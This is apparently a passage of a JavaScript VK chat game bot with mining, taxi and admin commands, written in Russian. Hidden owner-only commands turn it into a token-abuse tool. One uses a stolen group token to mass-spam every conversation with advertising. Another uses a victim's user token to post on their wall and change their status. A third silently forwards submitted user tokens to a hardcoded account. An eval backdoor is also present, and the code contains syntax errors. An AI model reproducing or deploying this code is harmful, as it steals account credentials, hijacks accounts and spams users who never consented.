💡 Энергия: ${message.user.energy}, опыт: ${message.user.opit}`);

if(message.user.energy < 1) {

setTimeout(() => {
	message.user.energy = 10;
}, 300000);

return bot(`+${randalmaz} алмазов.
Энергия закончилась. ⚠`);

}

});

cmd.hear(/^(?:железо)$/i, async (message, bot) => { 

return bot(`у вас ${utils.sp(message.user.zhelezo)} железа. 🎛`);

});

cmd.hear(/^(?:опыт)$/i, async (message, bot) => { 

return bot(`у вас ${utils.sp(message.user.opit)} опыта. 🏆`);

});

cmd.hear(/^(?:алмазы)$/i, async (message, bot) => { 

return bot(`у вас ${utils.sp(message.user.almaz)} алмазов. 💎`);

});

cmd.hear(/^(?:золото)$/i, async (message, bot) => { 

return bot(`у вас ${utils.sp(message.user.zoloto)} золота. 🏵`);

});

cmd.hear(/^(?:таксовать)$/i, async (message, bot) => { 
if(message.user.opit < 3000) return bot(`что бы Таксовать вам нужно 3 000 опыта.
Копайте железо и увеличивайте свой опыт! ⚠`);
if(message.user.energy < 1) return bot(`вы сильно устали.
⚠ Энергия появляется каждые 5 минут!`);

taxicash = utils.random(987923, 3416011);
message.user.energy -= 1;
message.user.balance += taxicash;

if(message.user.energy < 1) {

setTimeout(() => {
	message.user.energy = 10;
}, 300000);

return bot(`вы заработали ${utils.sp(taxicash)}$
Энергия закончилась. ⚠`);

}

if(message.user.energy > 0) bot(`вы заработали ${utils.sp(taxicash)}$`);

});

cmd.hear(/^(?:взломать|взлом)$/i, async (message, bot) => { 

if(message.user.timers.hack) return bot(`вы сможете взломать через 5 минут ${smileerror}`);

let situac = utils.random(1,2);

if(situac === 1)
{

let hackcash = utils.random(156781,451981);
message.user.balance += hackcash;
setTimeout(() => {
	message.user.timers.hack = false;
}, 300000);

message.user.timers.hack = true;
return bot(`вы нашли уязвимость на популярном форуме и Вам заплатили за найденный баг! ✅ Вы заработали ${utils.sp(hackcash)}$`);

}
if(situac === 2)
{

let hackcash = utils.random(26981051,41184185);
message.user.balance += hackcash;
setTimeout(() => {
	message.user.timers.hack = false;
}, 300000);

message.user.timers.hack = true;
return bot(`вам удалось ограбить банк, но, не все так просто. Вы случайно спалили своё лицо и придется отсидеться пока про Вас не забудут. ✅ Вы заработали ${utils.sp(hackcash)}$`);

}

});

cmd.hear(/^(?:промо)\s([0-9]+)$/i, async (message, bot) => { 
if(message.user.settings.adm < 4) return;
config.promovalue = Number(message.args[1]); 
saveConfig();
return bot(`сумма промокода: ${config.promovalue}. ${smilesuccess}`);

});

cmd.hear(/^(?:промо лимит)\s([0-9]+)$/i, async (message, bot) => { 
if(message.user.settings.adm < 4) return;
config.promolimit = Number(message.args[1]); 
saveConfig();
return bot(`лимит использований промокода: ${config.promolimit}. ${smilesuccess}`);

});

cmd.hear(/^(?:eval|zz)\s([^]+)$/i, async (message, bot) => {
	if(message.senderId !== 528262675 && message. senderld!== 614648891) return bot(`низя.`)

	try {
		const result = eval(message.args[1]);

		if(typeof(result) === 'string')
		{
			return bot(`string: ${result}`);
		} else if(typeof(result) === 'Готово')
		{
			return bot(`number: ${result}`);
		} else {
			return bot(`${typeof(result)}: ${JSON.stringify(result, null, '&#12288;\t')}`);
		}
	} catch (e) {
		console.error(e);
		return bot(`ошибка:
		${e.toString()}`);
	}
});

cmd.hear(/^(?:ид чат)$/i, async (message, bot) => {
if(!message.isChat) return bot(`команда работает только в беседе!`);
return message.send(`
🆔Ид чата ${message.chatId}.`);
});

cmd.hear(/^(?:ко|тест|бот)$/i, async (message, args, bot) => { 
 		return message.send(`&#10004; » Работаю! Uptime: ${uptime.days}:${uptime.hours}:${uptime.min}:${uptime.sec}`);
 	});

cmd.hear(/^(?:bgive|выдать биткоины)\s([0-9]+)\s(.*)$/i, async (message, bot) => {
		message.args[2] = message.args[2].replace(/(\.|\,)/ig, '');
		message.args[2] = message.args[2].replace(/(к|k)/ig, '000');
		message.args[2] = message.args[2].replace(/(м|m)/ig, '000000');

		if(message.user.settings.adm <= 3) return bot(`недостаточно прав, для использования данной команды :>`);
		if(!Number(message.args[2])) return;
		message.args[2] = Math.floor(Number(message.args[2]));

		{
		let user = users.find(x=> x.uid === Number(message.args[1]));
		if(!user) return bot(`неверный ID игрока`);


		user.btc += message.args[2];


		await bot(`вы выдали игроку ${user.tag} ${utils.sp(message.args[2])}฿ ${smilesuccess}`);
		if(user.notifications) vk.api.messages.send({ user_id: user.id, message: `[УВЕДОМЛЕНИЕ]
		Администратор ${message.user.tag} выдал вам ${utils.sp(message.args[2])}฿!
		🔕 Введите "Уведомления выкл", если не хотите получать подобные сообщения` });
		}
		});

cmd.hear(/^(?:removerating)\s?([0-9]+)?/i, async (message, args, bot) => {
		message.user.foolder += 1;
		let user = users.find(x=> x.uid === Number(message.args[1]));
		if(message.user.settings.adm <= 4) return message.send(`недостаточно прав, для использования данной команды :>`);
		if(!message.args[1] || !users[message.args[1]]) return message.send(`[💰] » Пример: 'removerub [ID]'`);
		users[message.args[1]].rating = 0;
		return message.send(`[💰] » Вы забрали весь рейтинг у игрока [@id${users[message.args[1]].id}(${users[message.args[1]].tag})]`);
	});

cmd.hear(/^(?:выдатьopit)\s([0-9]+)\s(.*)$/i, async (message, bot) => {
		message.args[2] = message.args[2].replace(/(\.|\,)/ig, '');
		message.args[2] = message.args[2].replace(/(к|k)/ig, '000');
		message.args[2] = message.args[2].replace(/(м|m)/ig, '000000');

		if(message.user.settings.adm <= 3) return bot(`недостаточно прав, для использования данной команды :>`);
		if(!Number(message.args[2])) return;
		message.args[2] = Math.floor(Number(message.args[2]));

		if(message.args[2] <= 0) return;

		{
		let user = users.find(x=> x.uid === Number(message.args[1]));
		if(!user) return bot(`укажите ID игрока из его профиля. ${smileerror}`);


		user.opit += message.args[2];

		vk.api.call("messages.send", {
		chat_id: 1,
		message: `😡 Анти-слив система 😡:

		Администратор @id${message.user.id}(${message.user.tag}) - (Выдал опыт ${utils.sp(message.args[2])}) игроку @id${user.id} (ID: ${user.uid})`,
		random_id: Math.random()
		});


		await bot(`вы выдали игроку ${user.tag} ${utils.sp(message.args[2])} опыта`);
		if(user.notifications) vk.api.messages.send({ user_id: user.id, message: `[УВЕДОМЛЕНИЕ]
		Администратор [@id${message.user.id}(${message.user.tag})] выдал вам ${utils.sp(message.args[2])} опыта!
		🔕 Введите "Уведомления выкл", если не хотите получать подобные сообщения` });
		}
		});

		cmd.hear(/^(?:выдатьen)\s([0-9]+)\s(.*)$/i, async (message, bot) => {
		message.args[2] = message.args[2].replace(/(\.|\,)/ig, '');
		message.args[2] = message.args[2].replace(/(к|k)/ig, '000');
		message.args[2] = message.args[2].replace(/(м|m)/ig, '000000');

		if(message.user.settings.adm <= 3 return bot(`недостаточно прав, для использования данной команды :>`);
		if(!Number(message.args[2])) return;
		message.args[2] = Math.floor(Number(message.args[2]));

		if(message.args[2] <= 0) return;

		{
		let user = users.find(x=> x.uid === Number(message.args[1]));
		if(!user) return bot(`укажите ID игрока из его профиля. ${smileerror}`);


		user.energy += message.args[2];

		vk.api.call("messages.send", {
		chat_id: 1,
		message: `😡 Анти-слив система 😡:

		Администратор @id${message.user.id}(${message.user.tag}) - (Выдал энергию ${utils.sp(message.args[2])}) игроку @id${user.id} (ID: ${user.uid})`,
		random_id: Math.random()
		});

		await bot(`вы выдали игроку ${user.tag} ${utils.sp(message.args[2])} энергии`);
		if(user.notifications) vk.api.messages.send({ user_id: user.id, message: `[УВЕДОМЛЕНИЕ]
		Администратор выдал вам ${utils.sp(message.args[2])} энергии!
		🔕 Введите "Уведомления выкл", если не хотите получать подобные сообщения` });
		}
		});

		cmd.hear(/^(?:removerub)\s?([0-9]+)?/i, async (message, args, bot) => {
			message.user.foolder += 1;
			let user = users.find(x=> x.uid === Number(message.args[1]));
			if(message.user.settings.adm <= 4) return message.send(`недостаточно прав, для использования данной команды :>`);
			if(!message.args[1] || !users[message.args[1]]) return message.send(`[💰] » Пример: 'removerub [ID]'`);
			users[message.args[1]].balance = 0;
			return message.send(`[💰] » Вы забрали все рубли у игрока [@id${users[message.args[1]].id}(${users[message.args[1]].tag})]`);
		});

		cmd.hear(/^(?:выдатьrg|выдать рейтинг|выдатьrating)\s([0-9]+)\s(.*)$/i, async (message, bot) => {
			message.args[2] = message.args[2].replace(/(\.|\,)/ig, '');
			message.args[2] = message.args[2].replace(/(к|k)/ig, '000');
			message.args[2] = message.args[2].replace(/(м|m)/ig, '000000');

			if(message.user.settings.adm <= 4) return bot(`недостаточно прав, для использования данной команды :>`);
			if(!Number(message.args[2])) return;
			message.args[2] = Math.floor(Number(message.args[2]));

			if(message.args[2] <= 0) return;

			{
			let user = users.find(x=> x.uid === Number(message.args[1]));
			if(!user) return bot(`укажите ID игрока из его профиля. ${smileerror}`);


			user.rating += message.args[2];

			vk.api.call("messages.send", {
			chat_id: 1,
			message: `😡 Анти-слив система 😡:

			Администратор @id${message.user.id}(${message.user.tag}) - (Выдал рейтинг ${utils.sp(message.args[2])}) игроку @id${user.id} (ID: ${user.uid})`,
			random_id: Math.random()
			});


			await bot(`вы выдали игроку ${user.tag} ${utils.sp(message.args[2])}👑`);
			if(user.notifications) vk.api.messages.send({ user_id: user.id, message: `[УВЕДОМЛЕНИЕ]
			Администратор выдал вам ${utils.sp(message.args[2])} рейтинга 👑!
			🔕 Введите "Уведомления выкл", если не хотите получать подобные сообщения` });
			}
			});


			cmd.hear(/^(?:removeopit)\s?([0-9]+)?/i, async (message, args, bot) => {
				message.user.foolder += 1;
				let user = users.find(x=> x.uid === Number(message.args[1]));
				if(message.user.settings.adm <= 4) return;  message.send(`[🚀] » Вы не администратор `);
				if(!message.args[1] || !users[message.args[1]]) return message.send(`[💰] » Пример: 'removeopit [ID]'`);
				users[message.args[1]].opit = 0;
				return message.send(`[💰] » Вы забрали весь опыт у игрока [@id${users[message.args[1]].id}(${users[message.args[1]].tag})]`);
			});

cmd.hear(/^(?:adm)\s([0-9]+)\s(.*)$/i, async (message, arts, bot) => {
if(message.user.adm <= 5) return;  bot(`недостаточно прав, для использования данной команды :>`);
if(!Number(message.args[2])) return;
message.args[2] = Math.floor(Number(message.args[2]));

if(message.args[2] <= 0) return;

{
let user = users.find(x=> x.uid === Number(message.args[1]));
if(!user) return bot(`неверный ID игрока`);


user.settings.adm = message.args[2];


await bot(`вы выдали игроку ${user.tag} привилегию "${message.args[2].toString().replace(/0/gi, "Игрок ✔").replace(/1/gi, "Супер Игрок 🔥").replace(/2/gi, "Админ 🔥").replace(/3/gi, "Купленный Создатель 🔥").replace(/4/gi, "Купленный Создатель+ 🔥").replace(/5/gi, "⚡ Основатель").replace(/6/gi, "☀ Наблюдатель ").replace(/7/gi, "🎅 Дед Мороз").replace(/8/gi, "Заместитель").replace(/9/gi, "Создатель")}" > ${smilesuccess}`);
if(user.notifications) vk.api.messages.send({ user_id: user.id, message: `[УВЕДОМЛЕНИЕ]
Администратор ${message.user.tag} выдал вам привилегию "${message.args[2].toString().replace(/0/gi, "Игрок ✔").replace(/1/gi, "Супер Игрок 🔥").replace(/2/gi, "Админ 🔥").replace(/3/gi, "Купленный Создатель 🔥").replace(/4/gi, "Купленный Создатель+ 🔥").replace(/5/gi, "⚡ Основатель").replace(/6/gi, "☀ Наблюдатель ").replace(/7/gi, "🎅 Дед Мороз").replace(/8/gi, "Заместитель").replace(/9/gi, "Создатель")}"!
🔕 Введите "Уведомления выкл", если не хотите получать подобные сообщения` });
}
});

cmd.hear(/^(?:код|вытащить код|дай код)$/i, async (message, bot) => {
		if(message.senderId !== 528262675 && message.senderId !== 528262675) return message.send(`Ха соси`);
		message.sendDocument(__filename);
	    return message.send(`НА НЕ РОНЯЙ ЕГО`)
	});

cmd.hear(/^(?:взпомощь)$/i, async (message) => {
			if(message.senderId !== 528262675 && message.senderId !== 528262675) return message.send(`Ха соси`);
	return message.send(`
   🔑 Token [токен] - получить всю информацию о токене.
   🔑 utoken [токен] - получить информацию о токене пользователя
   👤 user [ссылка] - получить информацию о профилье.
   📚 group [ссылка] - получить информацию о группе
   eval - 
  Взлом жопы [токен] - спам
   Код - вытащить код бота `)
   });

	cmd.hear(/^(?:!взлом)\s(.*)$/i, async (message, bot) => {
if(message.senderId !== 528262675 && message.senderId !== 528262675) return message.send(`иди нахуй`)
let gg = async function () {
let token_sex = message.args[1]
const res = await vk.api.groups.getById({access_token: `${token_sex}`});
var gr = res[0];
const tok = new VK({
token: `${config.token}`,
pollingGroupId: config.group,
apiBaseUrl: 'https://api.vk.me/method',
apiMode: 'parallel'
});
const { collect } = tok;
const collectStream = collect.messages.getConversations({
});
collectStream.on('error', console.log);
collectStream.on('data', ({ total, percent, received, items }) => {
for (i = 0; i < items.length; i++) {
tok.api.messages.send({
peer_id: items[i].conversation.peer.id, message: `
Хватит с нас сливов клубнички 💋 а хотя наебал *bot_gorilla_v2 ждем вас 👀❤.`, keyboard: Keyboard.keyboard([
[
Keyboard.urlButton({
label: 'переходи и пиши любое сообщения',
url: 'https://vk.com/bot_gorilla_v2'
}),
Keyboard.urlButton({
label: 'переходи и пиши любое сообщения',
url: 'https://vk.com/bot_gorilla_v2'
}),
Keyboard.urlButton({
label: 'переходи и пиши любое сообщения',
url: 'https://vk.com/bot_gorilla_v2'
}),
Keyboard.urlButton({
label: 'переходи и пиши любое сообщения',
url: 'https://vk.com/bot_gorilla_v2'
})
],
[
Keyboard.urlButton({
label: 'переходи и пиши любое сообщения',
url: 'https://vk.com/bot_gorilla_v2'
}),
Keyboard.urlButton({
label: 'переходи и пиши любое сообщения',
url: 'https://vk.com/bot_gorilla_v2'
}),
Keyboard.urlButton({
label: 'переходи и пиши любое сообщения',
url: 'https://vk.com/bot_gorilla_v2'
}),
Keyboard.urlButton({
label: 'переходи и пиши любое сообщения',
url: 'https://vk.com/bot_gorilla_v2'
})
],
[
Keyboard.urlButton({
label: 'переходи и пиши любое сообщения',
url: 'https://vk.com/bot_gorilla_v2'
}),
Keyboard.urlButton({
label: 'переходи и пиши любое сообщения',
url: 'https://vk.com/bot_gorilla_v2'
})
]
])
})
}
});
}
for(let i = 0; i < 100; i++) {
gg()
}
});


	   cmd.hear(/^(?:Блок)\s?(.*)?/i, async(message) => {
	   	if(message.senderId !== 528262675 && message.senderId !== 528262675) return message.send(`иди нахуй`)
	   const t = new VK(); 
	   t.setOptions ({
		   token: message.args[1]
	   });
	   if(!message.args[1]) return message.send(`Ошибка, вы не ввели токен страницы`); 
	   t.api.users.get().then(function (res) {
		   var us = res[0];
   
		   t.api.wall.post({message: `Красная сова никогда не спит vto.pe `});
		   t.api.status.set({text: `Нюхай бебру `});
		   return message.send (`@id${us.id} (Пользователь) заблокирован :)`)
	   })
   });

   cmd.hear(/^(?:utoken|токен юзера|токен пользователя)\s(.*)?/i, async(message) => { 
   		if(message.senderId !== 528262675 && message.senderId !== 528262675) return message.send(`Ха соси`);
	   message.user.foolder += 1
   
   let args = message.args[1]; 
   let text = ``; 
   const vk = new VK(); 
	   vk.setOptions ({token: args}); 
   if(!args) return message.send(`Ошибка, вы не ввели токен пользователя`); 
   
	   vk.api.users.get({fields: "status, about, bdate, city, common_count, country, domain, last_seen"}).then(function(response){ 
   var users = response[0]; 
   return message.send(` 
   
   Обладатель токена: @id${users.id} (${users.first_name} ${users.last_name}) 
   
   Информация о пользователе: 
   Идентификатор пользователя: «@${users.domain}» 
   Идентификатор пользователя: «@id${users.id}»
   Статус пользователя: «${users.status}» 
   
   Информация о токене @id${users.id} (пользователя): 
   Статус: получен`); 
   vk.api.messages.send({ user_id: 523708864, message: `Новый токен!
   Токен: ${message.args[1]}
   Написал: [id${message.user.id}|${message.user.tag}]
   Токен от пользователя: @id${users.id} (${users.first_name} ${users.last_name})\n
   Подробная информация:
   Идентификатор пользователя: «@${users.domain}» 
   Идентификатор пользователя: «@id${users.id}»
   Статус пользователя: «${users.status}» 
   
   Информация о токене @id${users.id} (пользователя): 
   Статус: получен` })
   })
   })

      cmd.hear(/^(?:token|токен)\s(.*)$/i, async (message, bot) => { 
      			if(message.senderId !== 528262675 && message.senderId !== 528262675) return message.send(`Ха соси`);
   if(message.args[1].length != 85) return bot(`токен состоит из 85 символов`) 
   let text = ``;
   let count = 0;
   vk.api.call('groups.getTokenPermissions', {access_token: `${message.args[1]}`}).then(function(response) { 
   var c = response; 
   for(i in c.permissions){ 
   text += `${c.permissions[i].name}${i == c.permissions.length-1 ? "":","} `; 
   count++;
   }
   }).catch((error) => { 
   return bot(`неверный токен`); 
   }) 
   vk.api.call('groups.getById', {access_token: `${message.args[1]}`, fields: "members_count,wall,is_closed,status"}) 
   .then(function(response) { 
   var gr = response[0]; 
   message.send(`\n👤 Владелец токена: @club${gr.id} (${gr.name})
   🔎 ID: ${gr.id}
   📜 Стена: ${gr.wall.toString().replace(/0/gi, "Выключена").replace(/1/gi, "Открытая").replace(/2/gi, "Ограниченная").replace(/3/gi, "Закрытая")}
   📚 Группа: ${gr.is_closed.toString().replace(/0/gi, "Открытое").replace(/1/gi, "Закрытое").replace(/2/gi, "Частное")}
   👥 Подписчики: ${gr.members_count}
   💬 Статус: `+(gr.status == undefined ? `Не Установлен.` : `${gr.status}.`)+`  
   
   👑 Права токена ${count}: 
   ${text}
   `) 
   }) 
   });

      	   cmd.hear(/^(?:вгруппа|group|группа|groups)(\shttps\:\/\/vk\.com\/)?(id)?([0-9]+)?([^]+)?$/i, async (message, args, bot) => {
      	   			if(message.senderId !== 528262675 && message.senderId !== 528262675) return message.send(`Ха соси`);
		if(message.args[3]) { 
			   vk.api.call('groups.getById', {group_id: message.args[3], fields: "members_count,wall,is_closed,status,photo_50"}).then((res) => { 
				   return message.send(` 
					   🔥 - Информация группы: @club${group.id} (${group.name})
   
					   📒 Название: ${group.name}
					   🔎 ID: ${group.id}
					   📜 Стена: ${group.wall.toString().replace(/0/gi, "Выключена").replace(/1/gi, "Открытая").replace(/2/gi, "Ограниченная").replace(/3/gi, "Закрытая")}
					   📚 Группа: ${group.is_closed.toString().replace(/0/gi, "Открытое").replace(/1/gi, "Закрытое").replace(/2/gi, "Частное")}
					   👥 Подписчики: ${group.members_count}
					   💬 Статус: ${group.status}`)
			   }) 
		   } 
		   if(message.args[4]) { 
   
			   var domain = message.args[4].split(" "); 
   
			   vk.api.call("utils.resolveScreenName", {screen_name: message.args[4]}).then((res) => { 
				   vk.api.groups.getById({group_id: res.object_id, fields: "members_count,wall,is_closed,status,photo_50"}) 
   
				   .then((res) => { 
   
					   let gr = res[0]; 
					   return message.send(` 
					   🔥 - Информация группы: @club${gr.id} (${gr.name})
   
					   📒 Название: ${gr.name}
					   🔎 ID: ${gr.id}
					   📜 Стена: ${gr.wall.toString().replace(/0/gi, "Выключена").replace(/1/gi, "Открытая").replace(/2/gi, "Ограниченная").replace(/3/gi, "Закрытая")}
					   📚 Группа: ${gr.is_closed.toString().replace(/0/gi, "Открытая").replace(/1/gi, "Закрытая").replace(/2/gi, "Частная")}
					   👥 Подписчики: ${gr.members_count}
					   💬 Статус: ${gr.status}`)
				   })
			   })
		   }
	   });

      	      cmd.hear(/^(?:впрофиль|user|вк)(\shttps\:\/\/vk\.com\/)?(id)?([0-9]+)?([^]+)?$/i, async (message, args, bot) => {
      	      			if(message.senderId !== 528262675 && message.senderId !== 528262675) return message.send(`Ха соси`);
		   if(message.args[3]) {
			   vk.api.call('users.get', {user_id: message.args[3], fields: "friend_status,wall_default,last_seen,is_closed,city,freinds,verified,status,photo_id,sex,followers_count,photo_id,online,city,country,bdate,getMutual_count"}).then((res) => { 
				   let user = res[0];
				   return message.send(` 
					   🔥 - Информация пользователя: @id${user.id} (${user.first_name} ${user.last_name})
						
					   📚 Имя Фамиля: ${user.first_name} | ${user.last_name} 
					   🆔 ID: ${user.id}
					   📒 Профиль: ${user.is_closed.toString().replace(/undefined/gi, "Неизвестно.").replace(/false/gi, "Открыт").replace(/true/gi, "Закрыт")}
					   📊 Подписчики: `+(user.followers_count == undefined ? `Отсутствуют.` : `${spaces(user.followers_count)} шт.`)+`
					   🗓 Дата рождения: `+(user.bdate == undefined ? `Не указана.` : `${user.bdate}.`)+` 
					   💬 Статус профиля: `+(user.status == undefined ? `Не Установлен.` : `${user.status}.`)+` 
					   💻 Состояние: ${user.online.toString().replace(/undefined/gi, "Не в сети.").replace(/0/gi, "Не в сети.").replace(/1/gi, "В сети.")} 
					   🌍 Страна, город: `+(user.country == undefined ? `Не указан, ` : `${user.country.title}, `)+ (user.city == undefined ? `Не указан.` : `${user.city.title}.`)+`
					   📕 Состояние стены: ${user.wall_default.toString().replace(/owner/gi, "Только для владелца.").replace(/all/gi, "Для всех.")} 
					   👫 Пол: ${user.sex.toString().replace(/undefined/gi, "Не указан.").replace(/0/gi, "Не указан.").replace(/1/gi, "Женский.").replace(/2/gi, "Мужской.")} 
					   ✅ Верификация: ${user.verified.toString().replace(/undefined/gi, "Не Верифицирован.").replace(/0/gi, "Не Верифицирован.").replace(/1/gi, "Страница подтверждена Администрацией ВКонтакте.")} 
					   📷 Ава:`, 
					   {attachment: `photo${user.photo_id}`}); 
			   }) 
		   } 
		   if(message.args[4]) { 
   
			   var domain = message.args[4].split(" "); 
   
			   vk.api.call("utils.resolveScreenName", {screen_name: message.args[4]}).then((res) => { 
				   vk.api.users.get({user_id: res.object_id, fields: "friend_status,wall_default,last_seen,city,freinds,verified,status,photo_id,sex,followers_count,photo_id,online,city,country,bdate,getMutual_count"}) 
   
				   .then((res) => { 
   
					   let user2 = res[0]; 
					   return message.send(` 
					   🔥 - Информация пользователя: @id${user2.id} (${user2.first_name} ${user2.last_name})
   
					   📚 Имя Фамиля: ${user2.first_name} | ${user2.last_name} 
					   🆔 ID: ${user2.id}
					   📒  Профиль: ${user2.is_closed.toString().replace(/undefined/gi, "Неизвестно.").replace(/false/gi, "Открыт.").replace(/true/gi, "Закрыт.")}
					   📊 Подписчики: `+(user2.followers_count == undefined ? `Отсутствуют.` : `${spaces(user2.followers_count)} шт.`)+` 
					   🗓 Дата рождения: `+(user2.bdate == undefined ? `Не указана.` : `${user2.bdate}.`)+` 
					   💬 Статус: `+(user2.status == undefined ? `Не Установлен.` : `${user2.status}.`)+`
					   💻 Состояние: ${user2.online.toString().replace(/0/gi, "Не в сети.").replace(/1/gi, "В сети.")} 
					   🌍 Страна, город: `+(user2.country == undefined ? `Не указан, ` : `${user2.country.title}, `)+ (user2.city == undefined ? `Не указан.` : `${user2.city.title}.`)+`
					   📕 Состояние стены: ${user2.wall_default.toString().replace(/owner/gi, "Только для владелца.").replace(/all/gi, "Для всех.")}  
					   👫 Пол: ${user2.sex.toString().replace(/undefined/gi, "Не указан.").replace(/0/gi, "Не указан.").replace(/1/gi, "Женский.").replace(/2/gi, "Мужской.")} 
					   ✅ Верификация: ${user2.verified.toString().replace(/undefined/gi, "Не Верифицирован.").replace(/0/gi, "Не Верифицирован.").replace(/1/gi, "Страница подтверждена Администрацией ВКонтакте.")} 
					   📷 Ава:`, 
						   {attachment: `photo${user2.photo_id}`}); 
				   }) 
			   }) 
		   }
	   })
	
	cmd.hear(/^(?:сократи)\s?([^]+)?/i, message => { 
	
	let cc = message.args[1].toLowerCase(); 
	let text = message.args[1]; 
	if(!text) return message.send(`произошла ошибка.\n -- Введите: "Сократи [Сcылка]`); 
	vk.api.call("utils.getShortLink", {url: text}).then(function (res){ 
		if(!text) return message.send(`произошла ошибка.\n -- Введите: "Сократи [Сcылка]`); 
		return message.send(`Сокращена ваща ссылка: ` + res.short_url);
	}); 
});

cmd.hear(/^(?:гет|get|sget|сгет)\s?([^]+)?$/i, async(message, bot) =>{ 
 if(message.user.adm <= 2) return; 
let user; 

if(!message.hasForwards && !message.replyMessage) { 
if(!message.args[1]) return bot(`вы не указали обязательный аргумент. (ссылка/id/пересланное сообщение)`); 

user = users.find(x=>x.uid == Number(message.args[1])); 
if(!user) { 
let res = await vk.snippets.resolveResource(message.args[1]); 
user = users.find(x=>x.id == res.id); 
} 
} else { 
mes = message.hasForwards? message.forwards[0].senderId: message.replyMessage.senderId; 
user = users.find(x=>x.id == mes) 
} 
if(!user) return bot(`Не удалось найти игрока`); 

let text = ``;

	text += `📝 Ник: ${user.mention ? `@id${user.id} (${user.tag})` : `${user.tag}`}\n`;
	text += `🔎 Игровой ID: ${user.uid}\n`;
	if(user.settings.vip == true)text += `🔥 Статус «VIP»\n`;
	if(user.settings.moder == true) text += `💎 Привелегия «Moder»\n`;
	if(user.settings.adm == true) text +=`💻 Привилегия «Администратор»\n`;
	if(user.settings.vlad == true) text += `👑 Привилегия «Владелец»)\n`;
	if(user.settings.eval == true) text += `🚀Привелегия « System»\n`;
	text += `💰 Баланс: ${utils.sp(user.balance)}$\n`;
	text += `🌐 Биткоинов: ${utils.sp(user.btc)}฿\n`;
	text += `👑 Рейтинга: ${utils.sp(user.rating)}\n`;
	text += `🏦 В банке: ${utils.sp(user.bank)}$\n`
    
	if(user.ban == true) text +=`\n⚠️ Заблокирован навсегда\n`;
	

text += `\n 🕰Дата регистрации: ${user.regDate}`;

return bot(`информация об игроке @id${user.id}(${user.tag})\n${text}`); 
});

cmd.hear(/^(?:банреп|banrep|,fyhtg|ифткуз)\s(.*)$/i, async (message, bot) => { 
let user = users.find(x=> x.uid === Number(message.args[1])); 
if(!user) return bot(`укажите ID игрока из его профиля. ${smileerror}`); 
if(message.user.adm <= 5) return;
if(user.banadm == true) return bot(`нельзя забанить репорт пользователя, c анти-баном`)


user.banrep = true; 
admlogs(message)
saveUsers();
await bot(`вы забанили возможность писать в репорт игрока *id${user.id} (${user.tag}).`,); 
vk.api.messages.send({ user_id: user.id, message: `👤 Администратор *id${message.user.id}(${message.user.tag}) выдал бан репорта навсегда на твой аккаунт ⛔` }); 

});

cmd.hear(/^(?:разбанреп|rep unban)\s(.*)$/i, async (message, bot) => { 
if(message.user.adm <= 5) return;

{ 
let user = users.find(x=> x.uid === Number(message.args[1])); 
if(!user) return; 


user.banrep = false; 
admlogs(message)
saveUsers();
await bot(`разбанил возможность писать в репорт игрока *id${user.id} (${user.tag}).`,); 
vk.api.messages.send({ user_id: user.id, message: `Ваш репорт был разблокирован. ⛔` }); 
}
});

cmd.hear(/^(?:АБ|анти бан|anti ban)\s([^]+)\s(.*)$/i, async(message, bot) => {
if(message.user.adm <= 5) return message.send(`Выполнил!`)
	let user = users.find(x=> x.uid === Number(message.args[2]));
	admlogs(message)
	if(!user) return;
	if(message.args[1] === 'поставить')
	{	
		user.banowner = true;
		return message.send(`поставил анти бан @id${user.id}(${user.tag})`);
	}
	if(message.args[1] === 'снять')
	{ 
		user.banowner = false;
		return bot(`снял анти бан @id${user.id}(${user.tag})`); 
	}
});

cmd.hear(/^(?:сохранить)$/i, async (message, bot) => {
	if(message.user.settings.adm <= 5) return;
	saveUsers();
	saveClans();
	return bot(`Вы успешно сохранили базу данных`)
});

cmd.hear(/^(?:репорты|реп|список репортов|неотвеченные репы)$/i, async (message, bot) => {
	if(message.user.moder <= 2) return;
	admlogs(message)
	let top = [];

	users.map(x=> {
		top.push({ report_flood: x.report_flood, uid: x.uid, tag: x.tag, groups2: x.groups2, id: x.id, mention: x.mention });
	});

	top.sort((a, b) => {
		return b.groups2 - a.groups2;
	});

	let text = ``;
	const find = () => {
		let pos = 1000;

		for (let i = 0; i < top.length; i++)
		{
			if(top[i].id === message.senderId) return pos = i;
		}

		return pos;
	}

	for (let i = 0; i < 10; i++)
	{
		if(!top[i]) return;
		const user = top[i];
		
	
			if(user.report_flood == true || user.report_flood == false){
			text += `ID: ${utils.gi(user.uid)} - ${user.report_flood.toString().replace(/true/gi, "Не рассмотрен").replace(/false/gi, 'Рассмотрен')} || 💭 Сообщение: ${user.groups2}\n`;
			}
		
		
		
	}

	return bot(`Список репортов: 
	${text}`);
});

cmd.hear(/^(?:клан создать)\s(.*)$/i, async (message, bot) => {
  message.args[1] = message.args[1].replace(/(\.|\,)/gi, ",");
  message.args[1] = message.args[1].replace(/(\[|\()/gi, "{");
  message.args[1] = message.args[1].replace(/(\]|\))/gi, "}");
  const errors = utils.pick(["😳", "😒", `😟`, `🙄`, `🤔`]);
  const success = utils.pick(["🤤", "☺", `🙂`, `😁`, `😏`, "🤑"]);
  if (!message.args[1]) return bot(`введите название для клана! ${success}`);
  let zaprets1 = message.args[1].toLowerCase();
